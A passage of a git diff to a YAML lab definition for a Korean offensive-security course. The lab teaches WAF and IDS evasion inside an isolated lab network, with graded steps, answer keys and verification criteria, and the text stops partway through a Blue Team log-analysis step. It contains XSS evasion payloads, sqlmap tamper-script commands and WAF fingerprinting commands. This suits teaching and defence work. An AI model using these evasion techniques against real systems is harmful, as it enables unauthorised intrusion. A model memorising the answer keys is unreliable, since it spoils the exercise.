@@ -1,37 +1,50 @@
 lab_id: standalone-attack-week10
-title: IDS / WAF 우회 — paranoia + tamper + R/B/P
+title: IDS / WAF 우회 (Evasion) — paranoia + tamper + R/B/P
 version: standalone-non-ai
 course: attack
 week: 10
 description: |
-  Suricata + ModSec 의 paranoia level 1 + threshold 우회 패턴 학습. case / encoding /
-  nested tag / sqlmap tamper script.
+  방어 측 detection (ModSec CRS paranoia 1 + libinjection + Suricata + Wazuh) 의
+  우회 기술. 6 우회 카테고리 (encoding / case / nested / fragmentation / timing /
+  protocol) + sqlmap tamper + WAF 식별. 본 환경의 paranoia 1 + libinjection 은
+  표준 변형을 모두 차단하므로, 학생은 (1) 각 변형이 어떤 룰에 매치되어 차단되는지
+  분석하고, (2) 우회가 성공(200)할 경우 ModSec audit log 의 사각지대(RelevantStatus
+  4xx/5xx 만 기록)를 이해하고, (3) Blue (ModSec audit / Suricata / Wazuh) 의 detection
+  을 cross-check 한 뒤, (4) Purple 관점에서 방어 강화 5 표준을 설계한다. 마지막 3 step
+  은 R/B/P 통합. **윤리적 한계**: 6v6 환경 안에서만, 학습 목적만. 외부 시스템 우회 =
+  정통망법 48조 위반.
 difficulty: hard
-duration_minutes: 150
-prerequisites: [W09]
+duration_minutes: 180
+audience: 사이버공격 (10주차)
+prerequisites: ["W09 패스워드 공격"]
 objectives:
-  - "XSS 5+ 우회 변형 매트릭스"
-  - "sqlmap --tamper 3 스크립트"
-  - "ModSec audit log 의 우회 차이 분석"
+  - "6 우회 카테고리 — encoding / case / nested / fragmentation / timing / protocol"
+  - "XSS / SQLi 우회 매트릭스 + 각 변형의 매치 룰 추적"
+  - "sqlmap --tamper 스크립트 + 변형 메커니즘"
+  - "WAF 식별 (wafw00f 한계 + 수동 fingerprint)"
+  - "Blue — ModSec audit(Serial) / Suricata eve.json / Wazuh alert cross-check"
+  - "Purple — Coverage Matrix + Detection Gap + 방어 강화 5 표준"
 pass_threshold: 0.6
 steps:
 
   - order: 1
     instruction: |
-      ## 🎯 MISSION
+      ## 🎯 MISSION (Red Team — XSS 우회 매트릭스)
 
-      XSS payload **5 우회 변형** → ModSec 응답 비교 + 각 변형의 *우회 의도* 인지 +
-      ModSec 941 카운트 추적.
+      XSS payload **5 우회 변형** 을 web (10.20.30.1, Host: juice.6v6.lab) 에 보내고
+      각 변형의 **응답 코드** 와 **우회 의도** 를 매트릭스로 정리하라. 각 변형이 어떤
+      가정을 깨려 하는지, 그리고 현 WAF(paranoia 1 + libinjection)가 그것을 막는지
+      판정한다.
 
       ## 💡 5 변형의 우회 의도 (학습 핵심)
 
-      | # | payload | 우회 기법 | 대응 룰 |
-      |---|---------|-----------|---------|
-      | 1 | `<script>alert(1)</script>` | baseline | 941100 |
-      | 2 | `<ScRiPt>alert(1)</ScRiPt>` | case mixing — regex 정규화 무시 노림 | 941100 (`(?i)`) |
-      | 3 | `%3Cscript%3Ealert(1)%3C/script%3E` | URL encoding — 디코드 전 매칭 회피 | ModSec 가 decode 후 매칭 |
-      | 4 | `<sc<script>ript>alert(1)</script>` | nested tag — filter 가 내부 `<script>` 제거 시 외부 `script` 잔존 | libinjection 가 토큰 분석 |
-      | 5 | `<svg/onload=alert(1)>` | event handler — `<script>` 키워드 없이 JS 실행 | 941160 (event handler) |
+      | # | payload | 우회 기법 | 깨려는 가정 |
+      |---|---------|-----------|-------------|
+      | 1 | `<script>alert(1)</script>` | baseline | (대조군) |
+      | 2 | `<ScRiPt>alert(1)</ScRiPt>` | case mixing | regex 가 대소문자 구분한다 |
+      | 3 | `%3Cscript%3Ealert(1)%3C/script%3E` | URL encoding | WAF 가 decode 전에 매칭한다 |
+      | 4 | `<sc<script>ript>alert(1)</script>` | nested tag | filter 가 내부 `<script>` 만 제거한다 |
+      | 5 | `<svg/onload=alert(1)>` | event handler | `<script>` 키워드만 차단한다 |
 
       ## 💻 실행 명령
 
@@ -42,36 +55,40 @@ steps:
         echo "$code | $p"
       done
       '
-      # ModSec 941 카운트 매트릭스
-      ssh 6v6-web 'sudo grep -c "id..\"941" /var/log/apache2/modsec_audit.log 2>/dev/null'
+      ATTACK_TS=$(ssh 6v6-attacker 'date -u +%Y-%m-%dT%H:%M:%S'); echo "ATTACK_TS=$ATTACK_TS"
       ```
 
       ## 📋 확인 사항
 
-      - 5 변형 모두 403 (paranoia 1 + CRS 941 룰셋 + libinjection 강력)
-      - ModSec 941 카운트 증가 (5 시도 = +5 매칭)
+      - 5 변형의 응답 코드 매트릭스 (이 환경에서는 5 변형 모두 403)
+      - 각 변형이 어떤 우회 가정을 깨려 했는지 인지
+      - ATTACK_TS 기록 (Blue 측 시간 상관용)
 
       ## 💡 왜 이걸 하는가?
 
-      Red Team — WAF 우회 패턴 학습. 각 변형이 *어떤 가정* 을 깨려고 하는지 + 현
-      CRS / libinjection 의 *어떤 보호* 가 효과적인지 인지.
+      Red Team — WAF 우회 패턴 학습. 단순히 "통과/차단" 이 아니라, 각 변형이 *어떤
+      방어 가정* 을 노리는지 + 현 CRS / libinjection 의 *어떤 보호* 가 효과적인지
+      인지하는 것이 핵심. 모두 차단되더라도 그 자체가 "이 WAF 는 표준 변형에 견고하다"
+      는 결론.
 
       ## 🔍 결과 해석
 
-      - **모두 403**: paranoia 1 + libinjection 강력 (예상)
-      - **일부 200**: 우회 성공 → exception 후보 (Blue 측 검토 + custom 룰 추가)
-      - **모두 200**: ModSec 비활성 — `apachectl -M | grep security2` 로 확인
+      - **모두 403**: paranoia 1 + libinjection 이 case/encoding/nested/event-handler
+        를 모두 매치 (이 환경의 예상 결과)
+      - **일부 200**: 우회 성공 후보 → STEP 5 의 audit log 사각지대 + Blue 검토 대상
+      - **모두 200**: ModSec 비활성 의심 → `ssh 6v6-web 'sudo apachectl -M | grep
+        security2'` 로 모듈 로드 확인
 
-      ## 비정상 시 대응
+      ## ⚠️ 비정상 시 대응
 
-      - **모두 200** — ModSec 비활성 또는 SecRuleEngine Off. `grep
-        SecRuleEngine /etc/apache2/mods-enabled/security2.conf`
-      - **모두 500** — ModSec 룰 syntax 오류. apache error_log 확인.
+      - 모두 200 — `ssh 6v6-web 'grep -rh SecRuleEngine /etc/apache2/ /etc/modsecurity/'`
+        로 SecRuleEngine On 확인
+      - 연결 실패 — `ssh 6v6-attacker 'curl -s -o /dev/null -w "%{http_code}" -H "Host: juice.6v6.lab" http://10.20.30.1/'` (정상 200 확인)
     hint: |
-      XSS 5 우회 변형 + 각 의도 + 941 카운트 매트릭스. case/encoding/nested/event
-      handler 의 *근거* 까지 인지.
+      XSS 5 변형 + 각 의도 + 응답 코드 매트릭스. case/encoding/nested/event-handler 의
+      *깨려는 가정* 까지 인지. 이 환경에선 모두 403 — "견고한 WAF" 가 정상 결론.
     category: bypass
-    points: 25
+    points: 12
     answer: |
       ssh -n 6v6-attacker '
       for p in "<script>alert(1)</script>" "<ScRiPt>alert(1)</ScRiPt>" "%3Cscript%3Ealert(1)%3C/script%3E" "<sc<script>ript>alert(1)</script>" "<svg/onload=alert(1)>"; do
@@ -79,109 +96,837 @@ steps:
         echo "$code | $p"
       done
       '
-    answer_detail: 5 우회 매트릭스.
+      ATTACK_TS=$(ssh -n 6v6-attacker 'date -u +%Y-%m-%dT%H:%M:%S'); echo "ATTACK_TS=$ATTACK_TS"
+    answer_detail: |
+      5 변형 응답 매트릭스. 이 환경(paranoia 1 + libinjection)은 case/url-enc/nested/
+      svg 를 모두 403 차단. baseline 은 941110(Script Tag), case 도 t:lowercase 로 941110,
+      url-enc 는 t:urlDecodeUni 후 941110, nested 는 libinjection 토큰 분석, svg 는
+      941160(event handler). 모든 변형이 949110(anomaly threshold) 초과 → 403.
     verify:
       type: output_contains
-      expect: '200'
+      expect: '403'
       field: stdout
       semantic:
-        intent: "WAF 우회"
-        success_criteria: ["5 변형 응답 매트릭스"]
+        intent: Red — XSS 5 우회 변형 응답 매트릭스 + 각 변형 의도.
+        success_criteria: ["5 변형 시도", "응답 코드", "ATTACK_TS"]
         acceptable_methods:
-          - "**[OSS] case mixing (ScRiPt)**"
-          - "**[OSS] URL encoding**"
-          - "**[OSS] nested tag (sc<script>ript)**"
-          - "**[OSS] svg / iframe 변형**"
-          - "**[OSS] event handler 변형 (onload/onerror)**"
-          - "**[OSS] HTML entity / unicode escape**"
-          - "**[OSS] charset / Content-Type 조작**"
-          - "**[OSS] paranoia 1 → 2 권장**"
+          - |
+            **[OSS] curl 우회 매트릭스** — 표준.
+              ssh 6v6-attacker 'for p in ...; do curl -s -o /dev/null -w "%{http_code}" -H "Host: juice.6v6.lab" "http://10.20.30.1/?q=$p"; done'
+            예상 출력 `403 x5` (이 환경) 또는 일부 200.
+            운영 해석: 각 변형이 차단되면 WAF 견고, 통과하면 우회 성공.
+          - |
+            **[OSS] case mixing (ScRiPt)** — regex 대소문자 우회 시도.
+            예상 출력 `403` (CRS t:lowercase transform).
+            운영 해석: 모던 WAF 는 lowercase 정규화 → 우회 어려움.
+          - |
+            **[OSS] URL encoding (%3Cscript%3E)** — decode 전 매칭 회피.
+            예상 출력 `403` (CRS t:urlDecodeUni).
+            운영 해석: WAF 가 decode 후 검사하면 차단.
+          - |
+            **[OSS] nested tag (<sc<script>ript>)** — filter 우회.
+            예상 출력 `403` (libinjection 토큰 분석).
+            운영 해석: libinjection 은 단순 string match 가 아닌 토큰 분석.
+          - |
+            **[OSS] svg / event handler (<svg/onload=>)** — script 키워드 회피.
+            예상 출력 `403` (CRS 941160).
+            운영 해석: 941160 은 onload/onerror 등 event handler 매치.
+        negative_signs: ["변형 1~2개만", "ATTACK_TS 누락", "응답 코드 없음"]
     target_vm: attacker
+    risk_level: medium
 
   - order: 2
     instruction: |
-      ## 🎯 MISSION
+      ## 🎯 MISSION (Red Team — SQLi 우회 + sqlmap tamper)
 
-      sqlmap의 **3 tamper 스크립트** 효과 비교 + 각 tamper 의 *변형 메커니즘* 인지 +
-      ModSec 942 카운트 매트릭스.
+      SQLi 수동 우회 변형 + **sqlmap --tamper** 3 스크립트를 web 에 시도하고, 각
+      tamper 의 변형 메커니즘과 차단 결과를 정리하라.
 
       ## 💡 3 tamper 의 변형 메커니즘 (학습 핵심)
 
       | tamper | 입력 → 변형 | 우회 의도 |
       |--------|-------------|-----------|
-      | `space2comment` | `UNION SELECT` → `UNION/**/SELECT` | space 매칭 룰 회피 |
+      | `space2comment` | `UNION SELECT` → `UNION/**/SELECT` | 공백 매칭 룰 회피 |
       | `randomcase` | `SELECT` → `SeLeCt` | regex `(?i)` 누락 룰 회피 |
       | `between` | `id=1` → `id BETWEEN 0 AND 2` | `=` 키워드 매칭 회피 |
 
       ## 💻 실행 명령
 
       ```bash
-      # tail -8 로 sqlmap 의 conclusion (parameter vulnerable 여부) 까지 표시
       ssh 6v6-attacker '
       for tamper in space2comment randomcase between; do
         echo "=== $tamper ==="
-        timeout 25 sqlmap -u "http://10.20.30.1/?q=1" --batch --tamper=$tamper --headers="Host: juice.6v6.lab" --threads=1 2>&1 | tail -8 | grep -iE "vulnerable|not vulnerable|all tested|ending|HTTPS|connect"
+        timeout 35 sqlmap -u "http://10.20.30.1/?q=1" --batch --tamper=$tamper --headers="Host: juice.6v6.lab" --threads=1 2>&1 | grep -iE "vulnerable|all tested|ending|403|forbidden" | head -4
       done
       '
-      # 942 카운트 증가
-      ssh 6v6-web 'sudo grep -c "id..\"942" /var/log/apache2/modsec_audit.log 2>/dev/null'
+      # ModSec 942(SQLi) 매치 카운트 — audit log 는 Serial 형식이라 grep 사용
+      ssh 6v6-web 'sudo grep -c "id .\"942" /var/log/apache2/modsec_audit.log 2>/dev/null'
       ```
 
       ## 📋 확인 사항
 
       - 3 tamper 모두 실행 + ending 출력
-      - sqlmap 의 *vulnerable / not vulnerable* 결론 (대부분 not vulnerable — Juice
-        Shop 의 `/?q=` 는 SPA route, SQL endpoint 가 아님)
-      - 942 카운트 증가
+      - sqlmap 의 결론 (이 환경: ModSec 가 403 차단 → "all tested ... not injectable")
+      - 942 매치 카운트 증가 (tamper 시도 자체가 ModSec 패턴 매치)
 
       ## 💡 왜 이걸 하는가?
 
-      sqlmap 의 --tamper 가 WAF 우회의 표준 도구. 학생이 *각 tamper 의 변형
-      메커니즘* 까지 인지 → custom tamper 작성 능력 의 토대.
+      sqlmap --tamper 는 WAF 우회의 표준 도구. 각 tamper 의 *변형 메커니즘* 을 인지하면
+      custom tamper 작성 능력의 토대가 된다. 이 환경의 juice `/?q=` 는 SPA route 라 SQL
+      endpoint 자체가 없고, ModSec + libinjection 이 강력해 모든 시도가 403 차단된다.
 
       ## 🔍 결과 해석
 
-      - **3 ending**: sqlmap 실행 완료
-      - **all not vulnerable**: Juice Shop 의 ModSec + libinjection 강력 + endpoint
-        자체 SQL injection 불가
-      - **942 카운트 증가**: tamper 시도 자체 가 ModSec 패턴 매칭
+      - **403 다수 + not injectable**: ModSec 가 sqlmap 시도를 모두 차단 (예상)
+      - **942 카운트 증가**: tamper payload 가 942(SQLi) 룰 매치 → audit log 기록
+      - **vulnerable 발견 시**: 즉시 강사 보고 (책임 있는 공개)
 
-      ## 비정상 시 대응
+      ## ⚠️ 비정상 시 대응
 
-      - **timeout 25 초과** — `--threads=1` 또는 `--delay=1` 추가
-      - **sqlmap 자체 거부** — `sqlmap --version` 확인 (1.x 이상)
-      - **942 카운트 0** — audit log path 다름. `sudo find /var/log -name
-        "modsec_audit*"`
+      - timeout 35 초과 — `--threads=1 --delay=1` 추가 또는 timeout 상향
+      - 942 카운트 0 — `ssh 6v6-web 'sudo find /var/log -name "modsec_audit*"'` 로 path 확인
     hint: |
-      sqlmap --tamper 3 + 각 tamper 메커니즘 + 942 카운트 매트릭스. SPA endpoint
-      라 *not vulnerable* 결론이 정상.
+      sqlmap --tamper 3 + 각 tamper 메커니즘 + 942 grep 카운트. ModSec 차단으로
+      not injectable 이 정상 결론. audit log 는 Serial 이라 jq 아닌 grep.
     category: bypass
-    points: 25
+    points: 12
     answer: |
       ssh -n 6v6-attacker '
       for tamper in space2comment randomcase between; do
         echo "=== $tamper ==="
-        timeout 25 sqlmap -u "http://10.20.30.1/?q=1" --batch --tamper=$tamper --headers="Host: juice.6v6.lab" --threads=1 2>&1 | tail -8 | grep -iE "vulnerable|not vulnerable|all tested|ending|HTTPS|connect"
+        timeout 35 sqlmap -u "http://10.20.30.1/?q=1" --batch --tamper=$tamper --headers="Host: juice.6v6.lab" --threads=1 2>&1 | grep -iE "vulnerable|all tested|ending|403|forbidden" | head -4
       done
       '
-      ssh -n 6v6-web 'sudo grep -c "id..\"942" /var/log/apache2/modsec_audit.log 2>/dev/null'
+      ssh -n 6v6-web 'sudo grep -c "id .\"942" /var/log/apache2/modsec_audit.log 2>/dev/null'
     answer_detail: |
-      3 tamper × sqlmap + 각 변형 메커니즘 + 942 카운트. SPA endpoint 라 not
-      vulnerable 이 정상 결론.
+      3 tamper × sqlmap. 이 환경은 ModSec 가 sqlmap 의 모든 요청을 403 차단(76+회) →
+      "all tested parameters do not appear to be injectable". SPA endpoint + libinjection.
+      942 카운트는 tamper 시도가 942(SQLi) 룰 매치하며 증가. audit log 는 Serial(Native)
+      format 이라 jq 가 아닌 grep 'id "942' 로 카운트.
     verify:
       type: output_contains
-      expect: 'random'
+      expect: ending
       field: stdout
       semantic:
-        intent: "sqlmap tamper"
-        success_criteria: ["3 tamper 실행"]
+        intent: Red — sqlmap tamper 3 + 변형 메커니즘 + 942 매치.
+        success_criteria: ["3 tamper 실행", "ending 출력", "942 카운트"]
         acceptable_methods:
-          - "**[OSS] space2comment (/**/ 주입)**"
-          - "**[OSS] randomcase**"
-          - "**[OSS] between (= → BETWEEN)**"
-          - "**[OSS] charunicodeescape**"
-          - "**[OSS] apostrophenullencode**"
-          - "**[OSS] equaltolike**"
-          - "**[OSS] custom tamper 작성**"
-          - "**[OSS] multiple tamper 동시 (--tamper=a,b,c)**"
+          - |
+            **[OSS] sqlmap --tamper** — 표준 WAF 우회.
+              ssh 6v6-attacker 'sqlmap -u ... --tamper=space2comment --batch'
+            예상 출력 `403 ... times` + `not injectable` + `ending`.
+            운영 해석: ModSec 가 차단하면 SQLi 불가, audit log 942 매치.
+          - |
+            **[OSS] space2comment** — 공백 → /**/.
+            예상 출력 `403` (CRS 942 매치).
+            운영 해석: 주석 삽입으로 공백 룰 회피 시도.
+          - |
+            **[OSS] randomcase / between** — 대소문자 / = 회피.
+            예상 출력 `403`.
+            운영 해석: libinjection 은 SQL 토큰 분석이라 우회 어려움.
+          - |
+            **[OSS] grep 942 카운트** — Serial audit log.
+              ssh 6v6-web 'sudo grep -c "id .\"942" /var/log/apache2/modsec_audit.log'
+            예상 출력 `숫자 증가`.
+            운영 해석: tamper 시도가 942(SQLi) 룰 매치.
+        negative_signs: ["tamper 1개만", "ending 없음", "jq 로 942 시도(audit 은 Serial)"]
     target_vm: attacker
+    risk_level: medium
+
+  - order: 3
+    instruction: |
+      ## 🎯 MISSION (Red Team — WAF 식별)
+
+      대상 web 의 WAF 를 식별하라. 자동 도구(wafw00f)의 결과와 수동 fingerprint(정상
+      요청 vs 공격 요청의 응답 차이 + Server 헤더)를 비교하여, 어느 쪽이 이 WAF 를
+      탐지하는지 판정한다.
+
+      ## 💻 실행 명령
+
+      ```bash
+      # wafw00f 는 hostname resolve 가 필요 → /etc/hosts 에 vhost 추가 (없으면)
+      ssh 6v6-attacker 'grep -q juice.6v6.lab /etc/hosts || sudo sh -c "echo 10.20.30.1 juice.6v6.lab dvwa.6v6.lab >> /etc/hosts"'
+      # 자동 식별 (wafw00f)
+      ssh 6v6-attacker 'wafw00f "http://juice.6v6.lab/" 2>&1 | grep -iE "behind|No WAF|detected|requests"'
+      # 수동 fingerprint — 정상(200) vs 공격(403) 응답 차이 + Server 헤더
+      ssh 6v6-attacker '
+      echo "정상:"; curl -s -o /dev/null -w "%{http_code}" -H "Host: juice.6v6.lab" "http://10.20.30.1/?q=hello"; echo
+      echo "공격:"; curl -s -o /dev/null -w "%{http_code}" -H "Host: juice.6v6.lab" "http://10.20.30.1/?q=<script>alert(1)</script>"; echo
+      echo "Server 헤더:"; curl -sI -H "Host: juice.6v6.lab" "http://10.20.30.1/" | grep -i server
+      '
+      ```
+
+      ## 📋 확인 사항
+
+      - wafw00f 결과 (이 환경: "No WAF detected" — ModSec stealth)
+      - 수동 fingerprint: 정상 200 vs 공격 403 의 명확한 차이 → WAF 존재 확정
+      - Server 헤더 (Apache)
+
+      ## 💡 왜 이걸 하는가?
+
+      wafw00f 는 응답 시그니처(특정 헤더/쿠키/차단 페이지)로 WAF 를 식별하는데, ModSec
+      는 기본 설정에서 자기 존재를 숨기는(stealth) 경향이 있어 generic detection 을
+      회피한다. 따라서 자동 도구만 믿으면 "No WAF" 라는 오판을 한다. 수동 fingerprint
+      (정상/공격 응답 코드 차이)가 WAF 존재를 확정하는 실전 기법이다.
+
+      ## 🔍 결과 해석
+
+      - **wafw00f "No WAF detected"**: ModSec 가 stealth → 자동 식별 회피 (도구 한계)
+      - **정상 200 + 공격 403**: 공격 페이로드에만 차단 → WAF(또는 application filter) 존재 확정
+      - 수동 fingerprint 가 자동 도구보다 신뢰성 높음
+
+      ## ⚠️ 비정상 시 대응
+
+      - wafw00f Site down — `/etc/hosts` 에 juice.6v6.lab → 10.20.30.1 추가 확인
+      - 정상/공격 모두 같은 코드 — ModSec 비활성 의심
+    hint: |
+      wafw00f(자동) + 수동 fingerprint(정상 200 vs 공격 403 + Server 헤더). 이 환경의
+      wafw00f 는 "No WAF"(stealth) — 자동 도구 한계 학습. 수동 fingerprint 가 핵심.
+    category: bypass
+    points: 10
+    answer: |
+      ssh -n 6v6-attacker 'grep -q juice.6v6.lab /etc/hosts || sudo sh -c "echo 10.20.30.1 juice.6v6.lab dvwa.6v6.lab >> /etc/hosts"'
+      ssh -n 6v6-attacker 'wafw00f "http://juice.6v6.lab/" 2>&1 | grep -iE "behind|No WAF|detected|requests"'
+      ssh -n 6v6-attacker '
+      echo "정상:"; curl -s -o /dev/null -w "%{http_code}" -H "Host: juice.6v6.lab" "http://10.20.30.1/?q=hello"; echo
+      echo "공격:"; curl -s -o /dev/null -w "%{http_code}" -H "Host: juice.6v6.lab" "http://10.20.30.1/?q=<script>alert(1)</script>"; echo
+      echo "Server:"; curl -sI -H "Host: juice.6v6.lab" "http://10.20.30.1/" | grep -i server
+      '
+    answer_detail: |
+      wafw00f 는 "No WAF detected by the generic detection" — ModSec 기본 stealth 라
+      응답 시그니처 미노출. 수동 fingerprint: 정상(/?q=hello)=200, 공격(/?q=<script>)=403
+      → 공격 페이로드에만 차단되는 차이로 WAF 존재 확정. Server: Apache/2.4.52 (Ubuntu).
+      교훈: 자동 도구의 한계 → 수동 행동 기반 fingerprint 가 신뢰성 높음.
+    verify:
+      type: output_contains
+      expect: '403'
+      field: stdout
+      semantic:
+        intent: Red — WAF 식별 (자동 도구 한계 + 수동 fingerprint).
+        success_criteria: ["wafw00f 실행", "수동 fingerprint (정상 vs 공격)", "WAF 존재 판정"]
+        acceptable_methods:
+          - |
+            **[OSS] wafw00f** — 자동 WAF 식별.
+              ssh 6v6-attacker 'wafw00f "http://juice.6v6.lab/"'
+            예상 출력 `No WAF detected` (이 환경, ModSec stealth).
+            운영 해석: 자동 도구는 stealth WAF 미탐 — 한계 인지.
+          - |
+            **[OSS] 수동 fingerprint (curl)** — 정상 vs 공격 응답 차이.
+              curl ... "/?q=hello" → 200, curl ... "/?q=<script>" → 403
+            예상 출력 `정상 200 / 공격 403`.
+            운영 해석: 공격 페이로드에만 차단 → WAF 존재 확정.
+          - |
+            **[OSS] Server 헤더** — 백엔드 식별.
+              curl -sI -H "Host: juice.6v6.lab" "http://10.20.30.1/" | grep -i server
+            예상 출력 `Server: Apache`.
+            운영 해석: ModSec on Apache 추정.
+          - "**[OSS] nikto / whatweb** — 보조 fingerprint (선택)."
+        negative_signs: ["wafw00f 만 (수동 fingerprint 누락)", "WAF 존재 판정 없음"]
+    target_vm: attacker
+    risk_level: low
+
+  - order: 4
+    instruction: |
+      ## 🎯 MISSION (Red Team — 정교한 우회 분석 + paranoia 1 한계)
+
+      "우회 성공처럼 보이는 거짓 양성" 을 검증하라. HTML entity 변형(`&#60;script&#62;`)
+      을 raw 로 보내면 200 이 나오는데, 이것이 진짜 우회인지 payload 깨짐인지 구분하고,
+      paranoia 1 의 알려진 한계를 분석 보고서로 작성한다.
+
+      ## 💻 실행 명령
+
+      ```bash
+      ssh 6v6-attacker '
+      echo "[A] raw & (URL 파라미터 구분자로 잘릴 수 있음):"
+      curl -s -o /dev/null -w "  code=%{http_code}\n" -H "Host: juice.6v6.lab" "http://10.20.30.1/?q=&#60;script&#62;alert(1)&#60;/script&#62;"
+      echo "[B] %26 encode (진짜 entity 가 q 값에 들어감):"
+      curl -s -o /dev/null -w "  code=%{http_code}\n" -H "Host: juice.6v6.lab" "http://10.20.30.1/?q=%26%2360%3Bscript%26%2362%3Balert(1)"
+      '
+      # web access.log 에 실제 수신된 q 값 확인 (& 잘림 증거)
+      ssh 6v6-web 'sudo tail -4 /var/log/apache2/juice_access.log 2>/dev/null | grep -oE "GET [^ ]+"'
+      ```
+
+      ## 📋 산출물 (분석 보고서)
+
+      ```markdown
+      # paranoia 1 우회 분석
+      ## entity 변형의 진실
+      - [A] raw &#60; → 200 이지만 access.log 에 `GET /?q=&` 로 기록 = & 가 파라미터
+        구분자라 q 값이 잘림 (빈 q) → ModSec 매치할 것 없음 → 200. **거짓 우회.**
+      - [B] %26 encode → 403. 진짜 entity 가 q 에 들어가면 ModSec 차단. **우회 아님.**
+      ## 결론: 이 환경의 paranoia 1 + libinjection 은 entity 변형도 차단.
+      ## paranoia 1 의 알려진 일반적 한계 (이 환경 외):
+      - paranoia 1 은 false-positive 최소화 위해 일부 정밀 룰 비활성 → paranoia 2 권장
+      - 단일 decode 만 하는 WAF 는 double encoding 에 약함 (이 환경은 t:urlDecodeUni)
+      ```
+
+      ## 💡 왜 이걸 하는가?
+
+      "200 = 우회 성공" 이라는 성급한 결론은 위험하다. URL 파라미터 구분자(`&`), fragment
+      (`#`) 때문에 payload 가 깨져서 200 이 나올 수 있다. 진짜 우회인지 검증하려면
+      access.log 에서 *실제 수신된 값* 을 확인해야 한다. 이것이 거짓 양성을 걸러내는
+      Red Team 의 기본 검증 절차다.
+
+      ## 🔍 결과 해석
+
+      - [A] 200 + access.log `q=&` = 거짓 우회 (payload 깨짐)
+      - [B] 403 = 진짜 entity 도 차단 → paranoia 1 견고
+    hint: |
+      entity 200 의 진실 검증 — raw & 는 잘려서 거짓 200, %26 encode 진짜 entity 는 403.
+      access.log 의 실제 q 값으로 증명 + paranoia 1 한계 분석 보고서.
+    category: analysis
+    points: 12
+    answer: |
+      ssh -n 6v6-attacker '
+      echo "[A] raw &:"; curl -s -o /dev/null -w "  code=%{http_code}\n" -H "Host: juice.6v6.lab" "http://10.20.30.1/?q=&#60;script&#62;alert(1)&#60;/script&#62;"
+      echo "[B] %26 encode:"; curl -s -o /dev/null -w "  code=%{http_code}\n" -H "Host: juice.6v6.lab" "http://10.20.30.1/?q=%26%2360%3Bscript%26%2362%3Balert(1)"
+      '
+      ssh -n 6v6-web 'sudo tail -4 /var/log/apache2/juice_access.log 2>/dev/null | grep -oE "GET [^ ]+"'
+    answer_detail: |
+      [A] raw &#60; → 200, 그러나 access.log 에 `GET /?q=&` (& 가 파라미터 구분자라 q 잘림)
+      = 거짓 우회. [B] %26 encode 로 진짜 &#60;script&#62; 를 q 에 넣으면 → 403 차단.
+      결론: paranoia 1 + libinjection 은 entity 변형도 막는다. 거짓 양성을 access.log
+      실수신 값으로 검증하는 것이 핵심 학습.
+    verify:
+      type: output_contains
+      expect: code
+      field: stdout
+      semantic:
+        intent: Red — entity 200 거짓 우회 검증 + paranoia 1 한계 분석.
+        success_criteria: ["raw vs %26 encode 비교", "access.log 실수신 값", "거짓 우회 판정"]
+        acceptable_methods:
+          - |
+            **[OSS] curl raw & vs %26 encode** — 거짓 양성 검증.
+              raw &#60; → 200(잘림) / %26%2360 → 403(진짜 entity)
+            예상 출력 `[A] 200, [B] 403`.
+            운영 해석: 200 이 항상 우회는 아님 — payload 깨짐 구분.
+          - |
+            **[OSS] access.log 실수신 값** — & 잘림 증거.
+              ssh 6v6-web 'sudo tail -4 /var/log/apache2/juice_access.log | grep -oE "GET [^ ]+"'
+            예상 출력 `GET /?q=&` (잘린 q).
+            운영 해석: WAF 가 본 실제 값으로 우회 진위 판정.
+          - "**[OSS] paranoia 1 한계 분석 보고서** — double encoding / 정밀 룰 trade-off."
+        negative_signs: ["거짓 우회를 진짜 우회로 결론", "access.log 검증 누락"]
+    target_vm: attacker
+    risk_level: low
+
+  - order: 5
+    instruction: |
+      ## 🎯 MISSION (Blue Team — ModSec audit 분석)
+
+      STEP 1~4 의 공격이 web ModSec audit log 에 어떻게 기록됐는지 분석하라. **이
+      환경의 audit log 는 JSON 이 아니라 Serial(Native multiline) 형식** 이므로 jq 가
+      아닌 grep 으로 파싱한다. 매치 룰 분포 + 응답 코드 + **RelevantStatus 사각지대**
+      를 확인한다.
+
+      ## 💻 실행 명령
+
+      ```bash
+      # audit log 형식 확인 (Serial — --boundary-- 구분자)
+      ssh 6v6-web 'sudo grep -m1 SecAuditLogType /etc/apache2/*/*.conf /etc/modsecurity/*.conf 2>/dev/null'
+      # 매치 룰 분포 (grep — Serial 이라 jq 불가)
+      ssh 6v6-web 'sudo grep -oE "id .\"[0-9]+\"" /var/log/apache2/modsec_audit.log | sort | uniq -c | sort -rn | head -8'
+      # 응답 코드 분포 (--F-- 섹션의 HTTP 응답 라인)
+      ssh 6v6-web 'sudo grep -E "^HTTP/[0-9.]+ [0-9]" /var/log/apache2/modsec_audit.log | awk "{print \$2}" | sort | uniq -c'
+      # 사각지대 검증 — RelevantStatus 설정 + 우회(200) 미기록 확인
+      ssh 6v6-web 'sudo grep SecAuditLogRelevantStatus /etc/modsecurity/*.conf /etc/apache2/*/*.conf 2>/dev/null | head -1'
+      ```
+
+      ## 📋 확인 사항
+
+      - SecAuditLogType **Serial** (JSON 아님) → grep 파싱
+      - 매치 룰: 941100/941110/941160(XSS), 942(SQLi), 949110(anomaly threshold), 980130(score)
+      - 응답 코드: 403 다수
+      - SecAuditLogRelevantStatus `^(?:5|4(?!04))` → **4xx(404제외)/5xx 만 기록** → 200 우회는 audit log 에 안 남음 (사각지대)
+
+      ## 💡 왜 이걸 하는가?
+
+      Blue Team — 공격 흔적을 ModSec 가 남긴 audit log 에서 추적. 형식(Serial vs JSON)을
+      먼저 확인해야 올바른 파서를 쓴다. 그리고 RelevantStatus 설정 때문에 *우회 성공
+      (200)한 공격은 audit log 에 기록되지 않는* 사각지대를 인지하는 것이 핵심 — 이것이
+      Purple 보완(STEP 9)의 동기가 된다.
+
+      ## 🔍 결과 해석
+
+      - 941xx 다수 = XSS 시도, 942xx = SQLi, 949110 = anomaly score 누적 차단
+      - 403 다수 = 차단 정상 작동
+      - RelevantStatus 4xx/5xx → 200 우회 미기록 = **detection blind spot**
+
+      ## ⚠️ 비정상 시 대응
+
+      - grep 결과 0 — `sudo find /var/log -name "modsec_audit*"` 로 path 재확인
+      - jq 가 빈 출력 — audit log 는 Serial 형식이라 정상 (jq 쓰지 말 것)
+    hint: |
+      audit log 는 Serial(Native) → grep 파싱 (jq 아님). 매치 룰 분포 + 403 +
+      RelevantStatus 4xx/5xx 사각지대(200 미기록). 형식 확인이 첫 단계.
+    category: blueteam
+    points: 14
+    answer: |
+      ssh -n 6v6-web 'sudo grep -m1 SecAuditLogType /etc/apache2/*/*.conf /etc/modsecurity/*.conf 2>/dev/null'
+      echo "=== 매치 룰 분포 ==="
